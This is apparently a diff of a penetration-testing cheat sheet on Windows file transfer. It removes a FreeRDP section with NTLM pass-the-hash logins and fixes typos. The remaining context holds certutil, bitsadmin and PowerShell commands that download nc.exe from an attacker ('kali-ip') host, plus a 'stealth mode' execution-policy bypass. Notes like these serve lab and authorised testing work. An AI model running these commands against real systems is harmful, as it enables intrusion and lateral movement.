@@ -9,28 +9,6 @@
 * Download a file with PowerShell
 * Upload a file with PowerShell
 
-## FreeRDP - A Free Remote Desktop Protocol
-
-* +clipboard
-* +auto-reconnect
-* /cert:ignore
-* /dynamic-resolution
-* /v: server
-* /pth: pass-the hash NTLM
-* /list-kbd show avaliable keyboards
-
-```bash
-
-xfreerdp3 +clipboard +auto-reconnect /u:DOMAIN\\user /p:password /v:remote-ip
-xfreerdp3 /list:kbd
-
-# RDP User/Password
-xfreerdp3 /u:user /v:ip /p:password /kbd:0x00010407 /dynamic-resolution +auto-reconnect +clipboard
-# RDP NTLM Pass-the-hash 
-xfreerdp3 /u:user /v:ip /pth:hidden /kbd:0x00010407 /dynamic-resolution +auto-reconnect +clipboard
- 
-```
-
 ## Use Kali Linux NC windows-binary
 
 ```bash
@@ -63,7 +41,7 @@ C:\Users\user> cd Downloads
 certutil -urlcache -split -f http://kali-ip/nc.exe nc.exe
 ```
 
-## Downlaod a file using bitsadmin
+## Download a file using bitsadmin
 
 ```powershell
 bitsadmin /create DownloadJob
@@ -73,7 +51,7 @@ bitsadmin /complete DownloadJob
 bitsadmin /info DownloadJob /verbose
 ```
 
-## Downlaod a file using powershell
+## Download a file using powershell
 
 ```powershell
 (New-Object Net.WebClient).DownloadFile('http://remote-ip/nc.exe', 'nc.exe')
@@ -86,7 +64,7 @@ Invoke-WebRequest -Uri 'http://remote-ip/nc.exe' -OutFile 'nc.exe' -proxy "http:
 
 ## Downlaod a file using powershell script with stealth mode
 
-* Bypass security policy and default profiel
+* Bypass security policy and default profile
 * -ExecutionPolicy Bypass
 * -NoProfile
 
